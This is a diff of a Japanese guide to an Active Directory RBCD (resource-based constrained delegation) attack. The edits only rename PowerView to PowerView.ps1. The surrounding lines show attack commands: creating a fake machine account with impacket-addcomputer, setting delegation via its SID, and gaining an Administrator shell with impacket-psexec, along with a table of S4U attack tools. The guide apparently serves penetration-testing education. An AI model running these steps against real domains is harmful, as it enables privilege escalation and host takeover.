@@ -223,10 +223,10 @@ sequenceDiagram
 
 ### 1. 権限の確認
 
-**PowerView (Windows)**
+**PowerView.ps1 (Windows)**
 
 ```powershell
-# PowerView をインポート
+# PowerView.ps1 をインポート
 Import-Module .\PowerView.ps1
 
 # 対象の権限を確認
@@ -311,10 +311,10 @@ impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'Password123!' -dc-
 
 ### 4. RBCD の設定
 
-**PowerView (Windows)**
+**PowerView.ps1 (Windows)**
 
 ```powershell
-# PowerView で RBCD を設定
+# PowerView.ps1 で RBCD を設定
 
 # FAKE01$ の SID を取得
 $ComputerSid = Get-DomainComputer FAKE01 -Properties objectsid | Select-Object -ExpandProperty objectsid
@@ -753,7 +753,7 @@ impacket-psexec -k -no-pass Administrator@web01.corp.local
 
 | ツール | 用途 |
 |---|---|
-| **PowerView** | 権限の列挙と RBCD 設定 (Windows) |
+| **PowerView.ps1** | 権限の列挙と RBCD 設定 (Windows) |
 | **Impacket rbcd.py** | RBCD の設定 (Linux) |
 | **Impacket getST.py** | S4U 攻撃 / チケット取得 |
 | **Rubeus** | S4U 攻撃 (Windows) |
